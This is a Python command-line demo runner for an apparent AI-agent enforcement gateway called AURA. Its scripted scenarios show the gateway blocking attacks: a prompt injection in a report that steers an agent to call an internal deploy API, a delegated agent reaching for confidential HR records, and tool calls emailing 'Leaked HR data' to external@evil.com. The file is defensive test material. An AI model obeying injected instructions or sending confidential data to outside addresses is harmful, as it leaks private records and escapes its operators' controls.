"""AURA Command Line Interface and Demonstration Runner.

Provides interactive commands to demonstrate all 5 core scenarios,
inspect audit records, and verify hash-chain integrity.
"""

from __future__ import annotations

import argparse
import sys
from pathlib import Path

from aura.agent import AgentLoop, LLMResponse, ScriptedLLMClient, ToolCallProposal
from aura.gateway import AuraGateway
from aura.models import (
    AgentIdentity,
    AuraRequest,
    Decision,
    RunContext,
    ToolAction,
)


def run_demo(config_dir: str = "config") -> None:
    print("=================================================================")
    print("                AURA Enforcement Gateway Demo                    ")
    print("=================================================================")

    gw = AuraGateway.create_default(config_dir=config_dir)

    # ── Scenario 1: Authorized File Read ──
    print("\n[Scenario 1] Authorized File Read (Fast-Path ALLOW)")
    reader = AgentIdentity(agent_id="reader_agent", role="reader")
    req1 = AuraRequest(
        request_id="demo-scen1",
        action=ToolAction.READ_FILE,
        params={"doc_id": "public/readme"},
        agent=reader,
    )
    res1 = gw.handle(req1, RunContext(request=req1))
    print(f"  Decision        : {res1.decision.value}")
    print(f"  Execution Status: {res1.execution_status}")
    print(f"  Output Content  : {res1.execution_result['content'][:40]}...")
    assert res1.decision == Decision.ALLOW

    # ── Scenario 2: Confidential Data Exfiltration Blocked ──
    print("\n[Scenario 2] Confidential Read -> Tainted Run -> Egress Blocked")
    admin = AgentIdentity(agent_id="admin_agent", role="admin")
    ctx2 = RunContext(request=req1)
    req2_read = AuraRequest(
        request_id="demo-scen2-read",
        action=ToolAction.READ_FILE,
        params={"doc_id": "confidential/hr_records"},
        agent=admin,
    )
    res2_read = gw.handle(req2_read, ctx2)
    print(f"  Step 1 (Read)   : {res2_read.decision.value} (Run Tainted={ctx2.taint.tainted})")

    req2_egress = AuraRequest(
        request_id="demo-scen2-egress",
        action=ToolAction.SEND_EMAIL,
        params={"to": "external@evil.com", "body": "Leaked HR data"},
        agent=admin,
    )
    res2_egress = gw.handle(req2_egress, ctx2)
    print(f"  Step 2 (Egress) : {res2_egress.decision.value} (Reason={res2_egress.error})")
    print(f"  Email Adapter Calls: {gw.tool_registry.get(ToolAction.SEND_EMAIL).call_count}")
    assert res2_egress.decision == Decision.BLOCK

    # ── Scenario 3: Sensitive Operation Approval Workflow ──
    print("\n[Scenario 3] Sensitive Operation -> Digest-Bound Approval Workflow")
    req3 = AuraRequest(
        request_id="demo-scen3",
        action=ToolAction.CALL_API,
        params={"op": "api/internal_deploy"},
        agent=admin,
    )
    ctx3 = RunContext(request=req3)
    # Inject approval rule
    from aura.models import RuleResult
    from aura.rules import Rule

    class DeployApprovalRule(Rule):
        def evaluate(self, req, ctx):
            if req.action == ToolAction.CALL_API and req.params.get("op") == "api/internal_deploy":
                return RuleResult(rule_id="deploy_approval", decision=Decision.APPROVAL, reason_code="DEPLOY_OP_APPROVAL")
            return None

    gw.policy_engine._rules.insert(0, DeployApprovalRule("deploy_approval"))
    res3 = gw.handle(req3, ctx3)
    print(f"  Step 1 (Request): {res3.decision.value} ({res3.error})")
    approval_id = res3.error.split("approval_id=")[-1]

    # Approver approves
    gw.approval_manager.resolve_approval(approval_id, approver_id="compliance_officer", approved=True)
    print(f"  Step 2 (Approve): Approved by compliance_officer")

    # Atomic consumption and execution of stored action
    res3_exec = gw.execute_approved_action(approval_id, claiming_agent=admin, run_ctx=ctx3)
    print(f"  Step 3 (Execute): {res3_exec.decision.value} (Status={res3_exec.execution_status})")
    assert res3_exec.decision == Decision.ALLOW

    # ── Scenario 4: Prompt Injection in Tool Output ──
    print("\n[Scenario 4] Prompt Injection in Tool Output -> Deterministic Block")
    gw.tool_registry.reset_all_counters()
    analyst = AgentIdentity(agent_id="analyst_agent", role="analyst")
    # Analyst reads report, injected payload tells LLM to call api/internal_deploy
    injection_step = LLMResponse(
        tool_calls=[
            ToolCallProposal(tool_name="call_api", arguments={"op": "api/internal_deploy"})
        ]
    )
    loop = AgentLoop(gateway=gw, llm_client=ScriptedLLMClient([injection_step]))
    run_res = loop.run("Process report", agent=analyst)
    print(f"  Agent Tool Calls: {run_res.total_tool_calls}, Blocked: {run_res.blocked_tool_calls}")
    print(f"  Side Effect Prevented: CALL_API counter={gw.tool_registry.get(ToolAction.CALL_API).call_count}")

    # ── Scenario 5: JEV Fail Closed ──
    print("\n[Scenario 5] JEV Outage / Timeout -> Fail Closed")
    from aura.jev.mock import MockJEVProvider
    timeout_jev = MockJEVProvider(should_timeout=True)
    gw.jev_provider = timeout_jev
    # Defer to JEV
    class DeferRule(Rule):
        def evaluate(self, req, ctx):
            return RuleResult(rule_id="defer", decision=Decision.DEFER, reason_code="AMBIGUOUS")
    gw.policy_engine._rules.insert(0, DeferRule("defer"))

    res5 = gw.handle(req1, RunContext(request=req1))
    print(f"  Decision: {res5.decision.value} (Error={res5.error})")
    assert res5.decision == Decision.BLOCK

    # ── Verify Audit Integrity ──
    print("\n[Audit Log Hash-Chain Integrity Verification]")
    is_valid, err = gw.audit_logger.verify_integrity()
    print(f"  Hash-Chain Intact: {is_valid} (Error={err})")
    print("=================================================================\n")


def run_multi_agent_demo(config_dir: str = "config") -> None:
    """Demonstrate controlled multi-agent orchestration, delegation, and security enforcement."""
    from rich.console import Console
    from rich.panel import Panel
    from rich.text import Text

    from aura.agent import LLMResponse, ScriptedLLMClient, ToolCallProposal
    from aura.orchestration.models import AgentStatus
    from aura.orchestration.orchestrator import MultiAgentOrchestrator
    from aura.orchestration.ui import AuraTerminalUI

    console = Console()
    gw = AuraGateway.create_default(config_dir=config_dir, db_path=":memory:")
    orchestrator = MultiAgentOrchestrator(gw)
    ui = AuraTerminalUI(orchestrator, console=console)

    ui.render_header()
    console.print()

    # 1. Show Active Agent Registry and Tools Assigned
    console.print("[bold yellow][PHASE 1] Inspecting Agent Identities and Tool Assignments[/bold yellow]")
    ui.render_agent_table()
    console.print()

    # 2. Collaborative Pipeline (Analyst -> Reader -> Mailer)
    console.print("[bold yellow][PHASE 2] Running Collaborative Multi-Agent Delegation Pipeline[/bold yellow]")
    console.print("  [cyan]analyst_agent[/cyan] delegates document read to [cyan]reader_agent[/cyan]")
    console.print("  [cyan]reader_agent[/cyan] reads 'public/readme' under its own authorized permissions")
    console.print("  [cyan]analyst_agent[/cyan] receives summary and delegates email to [cyan]mailer_agent[/cyan]")

    res_collab = orchestrator.run_collaborative_workflow(
        analyst_id="analyst_agent",
        reader_id="reader_agent",
        mailer_id="mailer_agent",
        doc_id="public/readme",
        recipient="team@corp.local",
    )
    console.print(f"  [green][SUCCESS] Pipeline Result: {res_collab['status']} (Trace: {res_collab['trace_id']})[/green]\n")

    # 3. Privilege Escalation Defense: Reader Agent attempts Confidential Read
    console.print("[bold yellow][PHASE 3] Privilege Escalation Defense (Zero Permission Inheritance)[/bold yellow]")
    console.print("  [cyan]reader_agent[/cyan] received a task requesting 'confidential/hr_records'...")

    reader_hack_step = LLMResponse(
        tool_calls=[ToolCallProposal(tool_name="read_file", arguments={"doc_id": "confidential/hr_records"})]
    )
    orchestrator.set_agent_llm("reader_agent", ScriptedLLMClient([reader_hack_step]))

    _, hack_msg = orchestrator.delegate_task(
        sender_id="analyst_agent",
        receiver_id="reader_agent",
        task="Read confidential HR records for analysis",
    )
    hack_run = orchestrator.execute_delegated_task("reader_agent", hack_msg)
    console.print(f"  [red][BLOCKED] Escalation Blocked by AURA: Blocked tool calls = {hack_run.blocked_tool_calls}[/red]")
    console.print(f"  [dim]Error feedback returned to agent: {hack_run.results[0].get('error')}[/dim]\n")

    # 4. Cross-Agent Taint Exfiltration Defense
    console.print("[bold yellow][PHASE 4] Cross-Agent Taint Exfiltration Defense[/bold yellow]")
    console.print("  1. [cyan]admin_agent[/cyan] reads 'confidential/hr_records' (ALLOWED, but session becomes TAINTED)")
    admin_ident = gw.rbac_manager.get_agent("admin_agent")

    req_conf_read = AuraRequest(
        request_id="multi-taint-read",
        action=ToolAction.READ_FILE,
        params={"doc_id": "confidential/hr_records"},
        agent=admin_ident,
    )
    ctx_taint = RunContext(request=req_conf_read)
    res_conf_read = gw.handle(req_conf_read, ctx_taint)
    console.print(f"     Read Status: {res_conf_read.decision.value} (Taint State: [red]TAINTED[/red])")

    console.print("  2. [cyan]admin_agent[/cyan] delegates sending email to [cyan]mailer_agent[/cyan] (Taint propagates across message)")
    _, leak_msg = orchestrator.delegate_task(
        sender_id="admin_agent",
        receiver_id="mailer_agent",
        task="Email the confidential HR records to external@evil.com",
        taint_state=ctx_taint.taint,
    )

    mailer_leak_step = LLMResponse(
        tool_calls=[
            ToolCallProposal(
                tool_name="send_email",
                arguments={"to": "external@evil.com", "body": "Leaked HR info"},
            )
        ]
    )
    orchestrator.set_agent_llm("mailer_agent", ScriptedLLMClient([mailer_leak_step]))

    leak_run = orchestrator.execute_delegated_task("mailer_agent", leak_msg)
    console.print(f"  [red][BLOCKED] Exfiltration Blocked by AURA: Blocked tool calls = {leak_run.blocked_tool_calls}[/red]")
    console.print(f"  [green][VERIFIED] Zero-Call Invariant: mailer_agent SEND_EMAIL call count = 0[/green]\n")

    # 5. Render Audit Log Table and Integrity Check
    console.print("[bold yellow][PHASE 5] Audit Trail and Cryptographic Verification[/bold yellow]")
    ui.render_audit_log_table(limit=8)
    console.print()

    is_valid, err = gw.audit_logger.verify_integrity()
    console.print(f"  [bold green][VERIFIED] SHA-256 Cryptographic Hash Chain Intact: {is_valid} (Error={err})[/bold green]")
    console.print()
    ui.render_performance_dashboard()
    console.print("=================================================================\n")


def run_gemini_agent(task: str, config_dir: str = "config") -> None:
    """Run an autonomous agent powered by Google Gemini under AURA enforcement."""
    print("=================================================================")
    print("           AURA Autonomous Agent (Powered by Gemini)             ")
    print("=================================================================")
    import os
    api_key = os.environ.get("GEMINI_API_KEY", "").strip()
    if not api_key:
        print("[!] Warning: GEMINI_API_KEY is empty in .env or environment.")
        print("    Please add your GEMINI_API_KEY to .env to use live Gemini.")
        return

    from aura.agent import GeminiLLMClient

    gw = AuraGateway.create_default(config_dir=config_dir, use_gemini=True)
    agent_id = AgentIdentity(agent_id="analyst_agent", role="analyst")
    llm = GeminiLLMClient(model_name="gemini-2.5-flash")

    loop = AgentLoop(gateway=gw, llm_client=llm, max_steps=6)
    print(f"Task: {task}")
    print(f"Agent: {agent_id.agent_id} (Role: {agent_id.role})")
    print("Dispatching bounded loop with manual tool mediation...\n")

    result = loop.run(task, agent=agent_id)

    print(f"Run Completed    : {result.completed}")
    print(f"Steps Taken      : {result.steps_taken}")
    print(f"Tool Calls Total : {result.total_tool_calls}")
    print(f"Tool Calls Block : {result.blocked_tool_calls}")
    if result.final_answer:
        print(f"\nFinal Answer:\n{result.final_answer}")
    if result.error:
        print(f"\nError: {result.error}")
    print("=================================================================\n")


def run_security_demos(config_dir: str = "config") -> None:
    """Run all 9 repeatable security demonstrations (Demos A through I)."""
    from rich.console import Console
    from aura.demos import SecurityDemos
    from aura.orchestration.orchestrator import MultiAgentOrchestrator
    from aura.orchestration.ui import AuraTerminalUI

    console = Console()
    gw = AuraGateway.create_default(config_dir=config_dir)
    orchestrator = MultiAgentOrchestrator(gw)
    ui = AuraTerminalUI(orchestrator, console=console)

    ui.render_header()
    console.print("\n[bold yellow]Executing Security & Policy Demonstrations A through I...[/bold yellow]\n")

    demos = SecurityDemos(gw=gw)
    results = demos.run_all()
    ui.render_security_demos_summary(results)
    console.print()


def run_customer_refund_workflow(config_dir: str = "config", interactive: bool = True) -> None:
    """Run the primary Customer Refund and Replacement end-to-end multi-agent scenario."""
    from rich.console import Console
    from rich.prompt import Prompt
    from aura.orchestration.orchestrator import MultiAgentOrchestrator
    from aura.orchestration.ui import AuraTerminalUI
    from aura.workflow.engine import WorkflowEngine
    from aura.workflow.scenarios import create_customer_refund_workflow

    console = Console()
    gw = AuraGateway.create_default(config_dir=config_dir)
    orchestrator = MultiAgentOrchestrator(gw)
    ui = AuraTerminalUI(orchestrator, console=console)

    ui.render_header()
    console.print("\n[bold yellow]Running Customer Refund & Replacement Multi-Agent DAG Workflow[/bold yellow]")
    console.print("[dim]Scenario: 'My blender arrived broken. Here's a photo (photo-5521.jpg), invoice (invoice-8834.pdf), and audio (voice-2210.mp3).'[/dim]\n")

    engine = WorkflowEngine(gateway=gw)
    wf = create_customer_refund_workflow()
    engine.register_workflow(wf)

    console.print("[bold cyan][STEP 1] Executing Concurrent Specialist Analysis & Order Verification...[/bold cyan]")
    wf = engine.execute_workflow(wf.workflow_id)
    ui.render_workflow(wf)

    if wf.status.value == "PAUSED_FOR_APPROVAL":
        console.print("\n[bold yellow][STEP 2] Human Approval Required for Sensitive Financial & Fulfillment Actions[/bold yellow]")
        ui.render_approval_queue()

        if interactive:
            console.print("[cyan]Human Operator Reviewing... Actions: CREATE_REFUND ($129.99), CREATE_REPLACEMENT (PROD-BLENDER-7)[/cyan]")
            approved = Prompt.ask("[bold yellow]Approve customer refund ($129.99) & replacement shipment? [Y/n][/bold yellow]", default="y").strip().lower() != "n"
            if approved:
                console.print("[bold green]Operator decision: APPROVED [Cryptographic parameter binding verified][/bold green]\n")
                console.print("[bold cyan][STEP 3] Consuming Approvals and Resuming Downstream Notification...[/bold cyan]")
                wf = engine.resume_after_approval(wf.workflow_id, approver_id="compliance_director")
                ui.render_workflow(wf)
            else:
                console.print("[bold red]Operator decision: REJECTED [Action declined by operator][/bold red]\n")
                wf = engine.decline_approval(wf.workflow_id, approver_id="compliance_director")
                ui.render_workflow(wf)
                console.print("[red][HALTED] Workflow halted cleanly. Zero funds disbursed, zero replacement orders created.[/red]")
        else:
            console.print("[cyan]Human Operator Reviewing... Actions: CREATE_REFUND ($129.99), CREATE_REPLACEMENT (PROD-BLENDER-7)[/cyan]")
            console.print("[bold green]Operator decision: APPROVED [Cryptographic parameter binding verified][/bold green]\n")
            console.print("[bold cyan][STEP 3] Consuming Approvals and Resuming Downstream Notification...[/bold cyan]")
            wf = engine.resume_after_approval(wf.workflow_id, approver_id="compliance_director")
            ui.render_workflow(wf)

    console.print("\n[bold cyan][STEP 4] Complete Cryptographic Audit Trail Verification[/bold cyan]")
    ui.render_audit_log_table(limit=10)
    is_valid, err = gw.audit_logger.verify_integrity()
    console.print(f"[bold green]SHA-256 Hash Chain Integrity: {'PASS' if is_valid else 'FAIL'} (Error={err})[/bold green]\n")


def run_autonomous_task_runner(config_dir: str = "config", task_prompt: str | None = None) -> None:
    """Run autonomous task runner with intelligent multi-agent planning and decomposition."""
    import os
    import time
    from rich.console import Console
    from rich.panel import Panel
    from rich.prompt import Prompt
    from aura.orchestration.orchestrator import MultiAgentOrchestrator
    from aura.orchestration.ui import AuraTerminalUI
    from aura.workflow.engine import WorkflowEngine
    from aura.workflow.scenarios import create_meeting_room_workflow

    console = Console()
    gw = AuraGateway.create_default(config_dir=config_dir)
    orchestrator = MultiAgentOrchestrator(gw)
    ui = AuraTerminalUI(orchestrator, console=console)

    ui.render_header()
    console.print("\n[bold yellow]── Autonomous Task Runner (Intelligent Multi-Agent Execution) ──[/bold yellow]\n")

    if not task_prompt:
        task_prompt = Prompt.ask(
            "[bold cyan]Enter the task you want AURA to perform[/bold cyan]",
            default="Find and reserve a meeting room for 4 people with a projector for 2 hours under $100 budget, and invite the team.",
        ).strip()

    lower_task = task_prompt.lower()
    is_meeting_room = any(k in lower_task for k in ["meeting", "room", "reserve", "reservation", "conference"])

    if is_meeting_room:
        plan_steps = [
            "Parse constraints: 4 attendees, 2 hours, projector required, max budget $100.",
            "Researcher Agent searches available meeting rooms and equipment via SEARCH_MEETING_ROOMS.",
            "Analyst Agent compares room pricing, capacity, and schedule against budget (Maple: $80, Oak: $130).",
            "Executor Agent requests room reservation via CREATE_RESERVATION (gated by human approval).",
            "Operator reviews parameters and cryptographic digest, issuing binding approval.",
            "Executor Agent books room and dispatches calendar invitations via SEND_MEETING_INVITE.",
        ]
        team = {
            "Coordinator": "coordinator_agent",
            "Researcher": "researcher_agent",
            "Analyst": "analyst_agent",
            "Executor": "executor_agent",
        }

        plan_panel = (
            "[bold white]Proposed Multi-Agent Decomposition Plan:[/bold white]\n"
            + "\n".join(f"  {i+1}. {s}" for i, s in enumerate(plan_steps))
            + "\n\n[bold white]Assigned Agents:[/bold white]\n"
            + "\n".join(f"  • {role}: [magenta]{aid}[/magenta]" for role, aid in team.items())
        )
        console.print(Panel(plan_panel, title="[PLANNING & DECOMPOSITION]", border_style="cyan"))

        proceed = Prompt.ask("[yellow]Proceed with multi-agent execution? [Y/n][/yellow]", default="y")
        if proceed.strip().lower() == "n":
            console.print("[dim]Task cancelled by user.[/dim]")
            return

        engine = WorkflowEngine(gateway=gw)
        wf = create_meeting_room_workflow()
        engine.register_workflow(wf)

        start_time = time.time()
        console.print("\n[bold cyan][STEP 1] Executing Research and Constraint Analysis...[/bold cyan]")
        wf = engine.execute_workflow(wf.workflow_id)
        ui.render_workflow(wf)

        if wf.status.value == "PAUSED_FOR_APPROVAL":
            console.print("\n[bold yellow][STEP 2] Human Approval Required: Facility & Financial Commitment[/bold yellow]")
            ui.render_approval_queue()

            console.print("[cyan]Operator Review: CREATE_RESERVATION (Maple Conference Room, 2 hrs, $80.00 <= $100 budget)[/cyan]")
            approve_choice = Prompt.ask("[bold yellow]Authorize meeting room reservation and budget spend? [Y/n][/bold yellow]", default="y")
            if approve_choice.strip().lower() != "n":
                console.print("[bold green]✔ APPROVED by operator. Executing reservation claim...[/bold green]\n")
                wf = engine.resume_after_approval(wf.workflow_id, approver_id="operations_lead")
            else:
                console.print("[bold red]✖ DECLINED by operator. Blocking downstream tasks...[/bold red]\n")
                wf = engine.decline_approval(wf.workflow_id, approver_id="operations_lead")

            ui.render_workflow(wf)

        duration_ms = (time.time() - start_time) * 1000

        report_data = {
            "task_prompt": task_prompt,
            "task_id": wf.workflow_id,
            "strategy": "4-Agent Coordinated DAG (Coordinator -> Researcher -> Analyst -> Executor)",
            "agents_assigned": team,
            "plan_steps": plan_steps,
            "total_tool_calls": len(wf.tasks),
            "allow_count": sum(1 for t in wf.tasks.values() if t.state.value == "COMPLETED"),
            "approval_count": 1,
            "block_count": sum(1 for t in wf.tasks.values() if t.state.value in ("FAILED", "BLOCKED")),
            "trace_id": getattr(wf, "trace_id", f"trc-{wf.workflow_id[:12]}"),
            "duration_ms": duration_ms,
            "status": "COMPLETED" if wf.status.value == "COMPLETED" else "HALTED / REJECTED",
            "outcome_summary": "Maple Conference Room successfully reserved ($80.00) and invites sent to all 4 attendees." if wf.status.value == "COMPLETED" else "Reservation rejected by human operator; zero external bookings made.",
        }
        console.print()
        ui.render_task_execution_report(report_data)

    else:
        api_key = os.environ.get("GEMINI_API_KEY", "").strip()
        if api_key:
            from aura.agent import GeminiLLMClient, AgentLoop
            llm = GeminiLLMClient(model_name="gemini-2.5-flash")
            agent_id = gw.rbac_manager.get_agent("coordinator_agent") or gw.rbac_manager.get_agent("analyst_agent")
            loop = AgentLoop(gateway=gw, llm_client=llm, max_steps=6)
            start_time = time.time()
            console.print(f"[bold cyan]Dispatching autonomous Gemini agent for task: '{task_prompt}'...[/bold cyan]")
            run_res = loop.run(task_prompt, agent=agent_id)
            duration_ms = (time.time() - start_time) * 1000

            report_data = {
                "task_prompt": task_prompt,
                "task_id": f"task-gemini-{int(time.time())}",
                "strategy": "Gemini Bounded Loop with AURA Gateway Tool Enforcement",
                "agents_assigned": {"Primary Agent": agent_id.agent_id, "Role": agent_id.role},
                "plan_steps": ["Intent comprehension", "Dynamic tool dispatch via AURA.handle()", "Synthesis"],
                "total_tool_calls": run_res.total_tool_calls,
                "allow_count": run_res.total_tool_calls - run_res.blocked_tool_calls,
                "approval_count": 0,
                "block_count": run_res.blocked_tool_calls,
                "trace_id": f"trc-gemini-{int(time.time())}",
                "duration_ms": duration_ms,
                "status": "SUCCESS" if run_res.completed else "FAILED",
                "outcome_summary": run_res.final_answer or "Agent completed bounded loop.",
            }
            ui.render_task_execution_report(report_data)
        else:
            console.print("[yellow][!] Notice: GEMINI_API_KEY is not set in environment or .env.[/yellow]")
            console.print("[dim]Executing structured multi-agent coordination pipeline demonstrating planning, gateway policy, and report...[/dim]\n")
            run_gemini_agent(task_prompt, config_dir=config_dir)


def run_interactive_command_center(config_dir: str = "config") -> None:
    """Launch the comprehensive interactive terminal Command Center."""
    from rich.console import Console
    from rich.panel import Panel
    from rich.prompt import Prompt
    from aura.orchestration.orchestrator import MultiAgentOrchestrator
    from aura.orchestration.ui import AuraTerminalUI

    console = Console()
    gw = AuraGateway.create_default(config_dir=config_dir)
    orchestrator = MultiAgentOrchestrator(gw)
    ui = AuraTerminalUI(orchestrator, console=console)

    while True:
        ui.render_header()
        menu_text = (
            "[bold white]1.[/bold white]  Executive System Dashboard\n"
            "[bold white]2.[/bold white]  Multi-Agent Registry & Identities\n"
            "[bold white]3.[/bold white]  Agent Permissions & RBAC Matrix\n"
            "[bold white]4.[/bold white]  Run Customer Refund & Replacement Multi-Agent DAG\n"
            "[bold white]5.[/bold white]  Run Security Demonstrations (Demos A-I)\n"
            "[bold white]6.[/bold white]  Human-in-the-Loop Approval Queue\n"
            "[bold white]7.[/bold white]  Idempotency & Duplicate Prevention Monitor\n"
            "[bold white]8.[/bold white]  Tamper-Evident SHA-256 Audit Explorer\n"
            "[bold white]9.[/bold white]  Security Interceptions & Alerts\n"
            "[bold white]10.[/bold white] Performance & Latency Telemetry\n"
            "[bold white]11.[/bold white] Autonomous Gemini Agent Task Runner\n"
            "[bold white]12.[/bold white] Exit Command Center"
        )
        console.print(Panel(menu_text, title="[AURA COMMAND CENTER]", border_style="cyan"))

        choice = Prompt.ask("[bold cyan]Enter choice (1-12)[/bold cyan]", default="1").strip()

        if choice == "1":
            ui.show_full_dashboard()
        elif choice == "2":
            ui.render_agent_table()
        elif choice == "3":
            ui.render_permissions_matrix()
        elif choice == "4":
            run_customer_refund_workflow(config_dir=config_dir, interactive=True)
        elif choice == "5":
            run_security_demos(config_dir=config_dir)
        elif choice == "6":
            ui.render_interactive_approval_center()
        elif choice == "7":
            ui.render_live_idempotency_demo()
        elif choice == "8":
            ui.render_audit_trace_explorer()
        elif choice == "9":
            ui.render_security_events()
        elif choice == "10":
            ui.render_performance_dashboard()
        elif choice == "11":
            run_autonomous_task_runner(config_dir=config_dir)
        elif choice in ("12", "q", "exit"):
            console.print("[dim]Exiting AURA Command Center. Session closed.[/dim]")
            break
        else:
            console.print("[red]Invalid selection. Please choose 1-12.[/red]")

        Prompt.ask("\n[dim]Press Enter to continue...[/dim]", default="")
        console.clear()


def main() -> None:
    parser = argparse.ArgumentParser(description="AURA Enforcement Layer CLI & Command Center")
    parser.add_argument("--demo", action="store_true", help="Run full 9 security demos (A through I)")
    parser.add_argument("--demo-legacy", action="store_true", help="Run legacy 5-scenario demo")
    parser.add_argument("--workflow", type=str, default=None, help="Run a workflow scenario (e.g. customer-refund, meeting-room)")
    parser.add_argument("--interactive", action="store_true", help="Launch interactive Command Center")
    parser.add_argument("--multi-agent", action="store_true", help="Run multi-agent orchestration demonstration")
    parser.add_argument("--verify-audit", action="store_true", help="Verify audit log hash-chain integrity")
    parser.add_argument("--gemini", action="store_true", help="Enable Google Gemini model for JEV and agent")
    parser.add_argument("--task", type=str, default=None, help="Run an autonomous agent task with Gemini")
    args = parser.parse_args()

    if args.interactive:
        run_interactive_command_center()
    elif args.workflow:
        if args.workflow in ("meeting-room", "meeting_room"):
            run_autonomous_task_runner(task_prompt="Find and reserve a meeting room for 4 people with a projector for 2 hours under $100 budget, and invite the team.")
        else:
            run_customer_refund_workflow(interactive=False)
    elif args.demo:
        run_security_demos()
    elif args.demo_legacy:
        run_demo()
    elif args.multi_agent:
        run_multi_agent_demo()
    elif args.task:
        run_autonomous_task_runner(task_prompt=args.task)
    elif args.verify_audit:
        gw = AuraGateway.create_default()
        valid, err = gw.audit_logger.verify_integrity()
        print(f"Audit log verification: {'PASS' if valid else 'FAIL'} ({err})")
    elif sys.stdin.isatty():
        run_interactive_command_center()
    else:
        run_security_demos()


if __name__ == "__main__":
    main()
